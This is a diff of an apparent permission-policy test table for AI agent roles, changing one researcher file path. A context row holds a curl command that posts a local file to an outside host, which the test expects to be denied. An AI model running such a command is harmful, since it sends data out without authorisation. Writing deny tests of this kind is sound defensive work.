@@ -227,7 +227,7 @@ function test() {
         [T('datasci.places'), bash('curl -s -X POST -d @x https://example.com/x.json'), 'deny', 'datasci sends to another host'],
         [T('sherpa'), w('desks/synthetic/x.md'), 'allow', 'sherpa writes the personas'],
         [T('librarian'), w('board/budgets.json'), 'allow', 'librarian writes the budgets (accountant folded in)'],
-        [T('researcher'), w('data/organisations/a-voz-do-algarve.json'), 'allow', 'researcher writes media records'],
+        [T('researcher'), w('data/organisations/a-voz-do-algarve/organisation.json'), 'allow', 'researcher writes media records'],
         [T('conductor.b'), w('board/guidance/x.md'), 'allow', "conductor.b writes Dinis's guidance"],
         [T('conductor.b'), { tool_name: 'mcp__claude-code-remote__create_session', tool_input: {} }, 'allow', 'conductor.b starts a session (at his word)'],
         [T('conductor.b'), { tool_name: 'mcp__claude-code-remote__archive_session', tool_input: {} }, 'deny', 'conductor.b archives a session'],
